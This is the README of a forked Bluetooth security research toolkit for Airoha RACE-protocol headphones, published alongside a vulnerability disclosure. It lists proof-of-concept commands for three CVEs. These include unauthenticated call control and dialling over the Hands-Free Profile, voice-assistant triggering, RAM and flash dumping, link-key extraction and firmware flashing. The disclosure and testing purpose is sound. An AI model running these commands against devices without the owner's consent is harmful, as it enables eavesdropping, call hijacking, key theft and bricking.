# RACE Toolkit

RACE Toolkit is the tool released alongside our Airoha research. You can find more about that in our [blog post](https://insinuator.net/2025/12/bluetooth-headphone-jacking-full-disclosure-of-airoha-race-vulnerabilities).

This repository contains a Python-based command-line toolkit for interacting with devices that expose the **RACE protocol** over various transports (BLE GATT, Bluetooth Classic RFCOMM, USB HID). It is primarily intended for further security research into the Airoha ecosystem and for end-users to check whether their devices are affected by the vulnerabilities.

## What's New in This Fork

This fork extends the original RACE toolkit with additional Bluetooth security research capabilities:

### New Commands for Vulnerability Testing

1. **Enhanced CVE PoCs**: Standalone proof-of-concept commands for each vulnerability
2. **Bluetooth Discovery Tools**: Active scanning and passive monitoring capabilities  
3. **Profile Exploitation Demos**: Hands-Free Profile (HFP) and experimental AVRCP demos
4. **BLE GATT Enumeration**: Comprehensive service/characteristic enumeration

### Key Additions

- **`enumerate-classic`** - Demonstrates CVE-2025-20701 (BR/EDR auth bypass) by enumerating Classic services without pairing
- **`hfp-demo`** - Exploits CVE-2025-20701 via Hands-Free Profile (answer calls, dial, control volume)
- **`ble-info`** - Demonstrates CVE-2025-20700 (GATT auth bypass) by enumerating services without pairing
- **`scan`** - Active Bluetooth device discovery (Classic and/or BLE)
- **`sniff`** - Passive BLE advertisement monitoring for research
- **`ble-speaker`** - [EXPERIMENTAL] BLE speaker control via vendor characteristics
- **`avrcp`** - [EXPERIMENTAL] AVRCP media control without authentication

### Improvements

- Auto-detection of BLE address types (Public/Random)
- Connection retry logic for unreliable Bluetooth connections
- Binary firmware version parsing
- Enhanced error handling and user feedback
- Comprehensive help text for all commands

---

## Features

- Implements a small subset of RACE commands. Mainly the ones relevant for further security research and to confirm whether a device is still vulnerable.
- Supports different RACE transports:
  * BLE GATT (via Bumble using a Bluetooth dongle, or via Bleak using the OS Bluetooth stack)
  * Bluetooth Classic RFCOMM (via Bumble using a Bluetooth dongle)
  * USB HID
- Semi-Automated vulnerability checks for the RACE-related CVEs (CVE-2025-20700, CVE-2025-20701, or CVE-2025-20702)
- Read and write device RAM
- Dump flash memory and partitions
- Query device metadata (SDK info, build version, Bluetooth Classic address)
- Firmware (FOTA) updates (or downgrades)

## Installation

This project supports two installation methods. You can choose either based on your preferred workflow:

* `pip` with `requirements.txt`
* `uv` using `pyproject.toml`

Both methods install the same dependencies. Due to the requirements of the [Bumble Bluetooth library](https://github.com/google/bumble), Python 3.10 is required.

### Option 1: Install with `pip`

```bash
python -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

### Option 2: Install with `uv`

This repository includes a `pyproject.toml` that can be used with [`uv`](https://github.com/astral-sh/uv).

```bash
uv sync
```

This will:

* Create a virtual environment
* Install all dependencies as pinned in `uv.lock`

To run commands inside the environment:

```bash
uv run python race_toolkit.py --help
```

To use the `gatt` or `rfcomm` transports, Bumble requires access to either your built-in Bluetooth controller or an external Bluetooth dongle. On some Linux distributions the Bluetooth daemon needs to be disabled. If you see any HCI-related or libUSB-related issues, try deactivating the service (`systemctl stop bluetooth`). On macOS, an external dongle is required, as the operating system does not expose the HCI layer.

Usually, the best approach is using an external Bluetooth dongle. This allows you to use the toolkit without interfering with your OS Bluetooth stack. Note that not all Bluetooth dongles are supported by Bumble.

## Requirements

- Python 3.10+
- A Bluetooth dongle (e.g. USB or UART) that is supported by Bumble. See Bumble's [Transport section](https://google.github.io/bumble/transports/usb.html).
- Some GATT-commands might also work without an additional dongle using the [bleak library](https://github.com/hbldh/bleak)

## Transports

RACE can be communicated via different transports. In this toolkit we implemented a subset of these. Each transport has different capabilities, limitations, and requirements.

### GATT (Bumble) (`--transport gatt`)

**Default transport.**

* Uses Bluetooth Low Energy GATT via the Bumble stack
* Supports scanning by device name or direct address
* Required for BLE-based vulnerability checks

**Notes:**

* Requires a Bumble-compatible Bluetooth controller
* Pairing can optionally be attempted using `--authenticate`

### GATT (Bleak) (`--transport bleak`)

* Uses the Bleak library for BLE GATT access
* Useful when Bumble is unavailable or incompatible

**Limitations:**

* Reduced feature set compared to Bumble-based GATT
* Not thoroughly tested. Once we switched to Bumble we didn't focus on the bleak transport any longer
* Not all checks or commands may work

### Bluetooth Classic RFCOMM (`--transport rfcomm`)

* Uses Bluetooth Classic over RFCOMM

**Notes:**

* Requires a Bumble-compatible Bluetooth controller
* A valid Bluetooth Classic address is required

### USB HID (`--transport usb`)

* Communicates directly with the device over USB HID
* Not many devices expose RACE over USB

**Notes:**

* Device is specified as `VID:PID`
* If omitted, the tool may enumerate devices interactively

## Usage


```bash
python race_toolkit.py [global options] <command> [command options]
```

## Global Options

These options apply to all commands unless stated otherwise.

| Option               | Description                                                                     |
| -------------------- | ------------------------------------------------------------------------------- |
| `-t`, `--transport`  | Transport method. One of `gatt`, `bleak`, `rfcomm`, `usb` (default: `gatt`)     |
| `-c`, `--controller` | Bumble Bluetooth controller (default: `usb:0`)                                  |
| `--target-address`   | Target device Bluetooth classic address                                         |
| `--le-names`         | One or more BLE device names to scan for if no address is provided              |
| `-d`, `--device`     | USB HID device VID:PID (only for `usb` transport)                               |
| `--outfile`          | Write command output to a file instead of stdout                                |
| `--debug`            | Enable debug logging                                                            |
| `--send-delay`       | Delay (in seconds) between RACE messages (might be required for old firmware?)  |
| `--authenticate`     | Attempt pairing/authentication during connection                                |

## Commands

This toolkit provides commands organized into several categories:

### Core Vulnerability Testing

#### `check`

**Comprehensive vulnerability assessment for RACE devices.**

Check a device for all RACE vulnerabilities: CVE-2025-20700 (GATT auth), CVE-2025-20701 (BR/EDR auth), and CVE-2025-20702 (RACE protocol exposure).

```bash
python race_toolkit.py check
```

The command will interactively guide you through:
1. BLE device discovery and selection
2. GATT service enumeration (CVE-2025-20700 test)
3. RACE protocol access test via GATT
4. Bluetooth Classic address retrieval
5. Classic service enumeration (CVE-2025-20701 test)
6. RACE protocol access test via RFCOMM (CVE-2025-20702 test)

**Tip**: If you already know your device's Bluetooth Classic address, use `--target-address` to skip auto-discovery.

**Workflow**: This is your starting point - run this first to get a comprehensive vulnerability assessment.

---

### CVE-2025-20700: Missing GATT Authentication

These commands demonstrate that BLE GATT services can be accessed without authentication:

#### `ble-info`

**Enumerate BLE GATT services without pairing.**

Connects to a BLE device and reads all GATT services and characteristics without authentication.

```bash
# Discover and enumerate a BLE device
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF ble-info

# Auto-detect address type (tries public first, then random)
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF ble-info

# Explicit address type
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF/P ble-info
```

**Output**: Complete GATT service tree with characteristic properties and values.

**Workflow**:
1. Use `scan --mode ble` to discover BLE devices
2. Copy target device address
3. Run `ble-info` with the address
4. Verify GATT access without authentication prompt

---

### CVE-2025-20701: Missing BR/EDR Authentication

These commands demonstrate Bluetooth Classic profile access without pairing:

#### `enumerate-classic`

**Enumerate Bluetooth Classic services without pairing.**

Connects via BR/EDR and enumerates all SDP services without authentication.

```bash
# Enumerate Classic services on a known device
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF enumerate-classic

# Interactive mode - scans first
python race_toolkit.py -c usb:0 enumerate-classic
```

**Output**: List of all exposed Classic services (SDP records) accessible without pairing.

**Workflow**:
1. Use `scan --mode classic` to discover Classic devices
2. Run `enumerate-classic` with target address
3. Verify SDP access without pairing prompt

#### `hfp-demo`

**Demonstrate Hands-Free Profile exploitation without pairing.**

Accesses HFP (Hands-Free Profile) to answer calls, dial numbers, adjust volume, etc., without authentication.

```bash
# Get device info
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF hfp-demo --action info

# Answer incoming call
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF hfp-demo --action answer

# Dial a number
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF hfp-demo --action dial --number 5551234567

# Trigger voice assistant
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF hfp-demo --action voice

# Available actions: info, answer, reject, hangup, dial, voice, ring, volume, sco-ring
```

**Impact**: Remote control of phone calls and voice assistant without user consent.

**Workflow**:
1. Identify a headset/speaker with HFP support
2. Test `--action info` to verify HFP access
3. Demonstrate call control with other actions

#### `avrcp` [EXPERIMENTAL]

**AVRCP media control without authentication (may fail on some devices).**

Attempts to control media playback via AVRCP profile without pairing.

```bash
# Test connection
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF avrcp --action info

# Media controls
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF avrcp --action play
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF avrcp --action pause
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF avrcp --action vol-up --repeat 5
```

**Note**: This command frequently fails because:
- Device must not be connected to another source (phone, etc.)
- Some devices reject unauthenticated AVRCP connections
- Connection is often cancelled by device

---

### CVE-2025-20702: RACE Protocol Exposure

#### `enumerate-race`

**Test RACE protocol access over Classic Bluetooth.**

Attempts to access RACE protocol commands via RFCOMM without authentication.

```bash
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF enumerate-race
```

**Workflow**: Same as other CVE-2025-20701 PoCs, but specifically tests RACE RFCOMM service access.

---

### RACE Protocol Commands

These commands interact with the proprietary RACE protocol on Airoha chipsets:

#### `ram`

Read from device RAM.

```bash
python race_toolkit.py ram --address 0x10000 --size 0x100
```

**Options:**
- `--address` (required): Target RAM address (hex)
- `--size` (required): Number of bytes to read (hex, multiple of 4)

**Note**: Output is hex-dumped unless `--outfile` is specified.

---

#### `flash`

Dump flash memory.

```bash
python race_toolkit.py flash --address 0x0 --size 0x1000
```

**Options:**
- `--address` (required): Flash start address (hex, multiple of 0x100)
- `--size` (required): Number of bytes to dump (hex, multiple of 0x100)

---

#### `link-keys`

Retrieve stored Bluetooth BR/EDR link keys.

```bash
python race_toolkit.py link-keys
```

**Note**: This command does not work on many devices. Consider using `dump-partition` to extract the NVDM partition instead, which contains link keys with more metadata.

---

#### `bdaddr`

Query the Bluetooth Classic address via RACE.

```bash
python race_toolkit.py bdaddr
```

**Use case**: Useful for non-discoverable devices. Eliminates need for Ubertooth or other sniffing hardware.

---

#### `sdkinfo`

Retrieve SDK information from the device.

```bash
python race_toolkit.py sdkinfo
```

**Note**: Output is interpreted as UTF-8 text. May just show "version 1" on some devices.

---

#### `buildversion`

Retrieve the firmware build version string.

```bash
python race_toolkit.py buildversion
```

**Note**: Many devices no longer respond to this command. When available, helpful for fingerprinting.

---

#### `mediainfo`

Dump metadata about the currently playing media. **Sony WH-CH720N specific**.

```bash
python race_toolkit.py mediainfo
```

**Important**: This is a proof-of-concept feature with hard-coded RAM offsets. Only works on specific firmware versions of Sony WH-CH720N.

---

#### `dump-partition`

Interactively dump a flash partition.

```bash
python race_toolkit.py --outfile partition.bin dump-partition
```

**Workflow**:
1. Reads and parses the partition table
2. Displays all partitions
3. Prompts the user to select a partition
4. Dumps the selected partition to file

**Common use**: Dump NVDM partition (usually #6) which contains configuration data and Bluetooth link keys.

**Note**: The `--outfile` option is required.

---

#### `fota`

**⚠️ WARNING: Advanced users only! Can brick devices!**

Perform a FOTA firmware update (or downgrade).

```bash
python race_toolkit.py fota --fota-file firmware.bin
```

**Options:**
- `--fota-file` (required): Path to the FOTA image
- `--dont-reflash`: Skip erase/reflash (for retrying current FOTA)
- `--chunks-per-write`: Number of chunks per write (default: 3)

**Confirmed working**: Sony WH-CH720N, Sony WH-1000 XM6

**Not supported**: TWS earbuds (requires additional implementation)

**Firmware sources**: [MDR Proxy Repository](https://github.com/lzghzr/MDR_Proxy)

**DANGER**: Firmware modification can brick devices. Proceed only if you understand the risks and have the correct firmware for your device.

---

### Utility Commands

#### `scan`

**Active Bluetooth device discovery.**

Scan for Bluetooth Classic and/or BLE devices.

```bash
# Scan for Classic devices (default)
python race_toolkit.py -c usb:0 scan

# Scan for BLE devices
python race_toolkit.py -c usb:0 scan --mode ble --timeout 10

# Scan for both
python race_toolkit.py -c usb:0 scan --mode both --timeout 15 --extended
```

**Options:**
- `--mode`: `classic`, `ble`, or `both` (default: classic)
- `--timeout`: Scan duration in seconds (default: 10)
- `--extended`: Use extended inquiry for more device info

**Output**: Device addresses, names, and metadata.

---

#### `sniff`

**Passive BLE advertisement monitoring.**

Continuously capture BLE advertisements without active scanning.

```bash
# Continuous monitoring (Ctrl+C to stop)
python race_toolkit.py -c usb:0 sniff

# Time-limited sniffing
python race_toolkit.py -c usb:0 sniff --timeout 30

# Filter by name
python race_toolkit.py -c usb:0 sniff --filter "Headphones"

# Filter by address prefix
python race_toolkit.py -c usb:0 sniff --filter-addr "AA:BB:CC"

# Show raw advertisement data
python race_toolkit.py -c usb:0 sniff --show-raw --show-uuids
```

**Options:**
- `--timeout`: Duration in seconds (0 = continuous)
- `--filter`: Filter by device name substring
- `--filter-addr`: Filter by MAC address prefix
- `--show-raw`: Display raw advertisement bytes
- `--show-uuids`: Display advertised service UUIDs
- `--active`: Use active scanning (send scan requests)

**Use case**: Research tool for monitoring BLE traffic, similar to nRF Connect.

---

#### `ble-speaker` [EXPERIMENTAL]

**BLE speaker control via vendor-specific characteristics.**

Attempts to control speakers via BLE GATT vendor characteristics.

```bash
# Discover control characteristics
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF ble-speaker --action probe

# Read all characteristics
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF ble-speaker --action read-all

# Test writable characteristics
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF ble-speaker --action write-test
```

**Note**: Limited success. Vendor characteristics are device-specific and not well documented. Most writes fail with length errors.

---

#### `raw`

Send a raw RACE command packet.

```bash
python race_toolkit.py raw --id 0x5A10
```

**Option:**
- `--id` (required): RACE command ID (hex)

**Use case**: Low-level protocol research and testing undocumented commands.

---

## Workflows & Examples

### Workflow 1: Test Device for All Vulnerabilities

```bash
# Single command comprehensive check
python race_toolkit.py -c usb:0 check

# Follow interactive prompts to test all three CVEs
```

### Workflow 2: Demonstrate CVE-2025-20700 (BLE GATT Auth Bypass)

```bash
# Step 1: Discover BLE devices
python race_toolkit.py -c usb:0 scan --mode ble --timeout 10

# Step 2: Enumerate GATT services without pairing
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF ble-info

# Result: You should see all GATT services/characteristics without any pairing prompt
```

### Workflow 3: Demonstrate CVE-2025-20701 (Classic Auth Bypass)

```bash
# Step 1: Discover Classic devices
python race_toolkit.py -c usb:0 scan --mode classic

# Step 2: Enumerate Classic services
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF enumerate-classic

# Step 3: Exploit HFP profile
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF hfp-demo --action info
python race_toolkit.py -c usb:0 --target-address AA:BB:CC:DD:EE:FF hfp-demo --action voice

# Result: You gain access to phone call controls and voice assistant without pairing
```

### Workflow 4: Extract NVDM Configuration

```bash
# Step 1: Connect via RACE transport (BLE GATT default)
python race_toolkit.py --target-address AA:BB:CC:DD:EE:FF --outfile nvdm.bin dump-partition

# Step 2: Select partition 6 (NVDM) when prompted

# Result: NVDM partition containing config and Bluetooth link keys saved to nvdm.bin
```

### Workflow 5: Research BLE Traffic

```bash
# Passive monitoring with filtering
python race_toolkit.py -c usb:0 sniff --filter "Sony" --show-uuids --active

# Continuous monitoring of all devices
python race_toolkit.py -c usb:0 sniff --show-raw
```

---

## Best Practices

### For Vulnerability Testing

1. **Always start with `check` command** - Provides comprehensive assessment
2. **Use specific PoCs** for demonstrations - `enumerate-classic`, `hfp-demo`, `ble-info`
3. **Verify no pairing prompts** - The vulnerability allows access without user consent
4. **Test multiple devices** - Results vary by manufacturer/firmware

### For Research

1. **Use `scan` for discovery** - Quick device identification
2. **Use `sniff` for monitoring** - Passive traffic analysis
3. **Use `ble-info` for GATT enumeration** - Complete service tree
4. **Check address type** - Try with `/P` (public) or `/R` (random) suffix if auto-detect fails

### For RACE Protocol Work

1. **Get Classic address first** - Use `bdaddr` command or sniffing
2. **Start with read-only commands** - `sdkinfo`, `buildversion` before `ram`/`flash`
3. **Backup before FOTA** - `dump-partition` NVDM partition first
4. **Use correct firmware** - Double-check device model before FOTA

---

## Notice

This tool is intended for **research and educational purposes only**.

- Do not use on devices you do not own or have permission to test!
- Flash and RAM access can permanently brick devices!
- Only use the FOTA command if you know what you are doing! We can't help you with bricked devices!
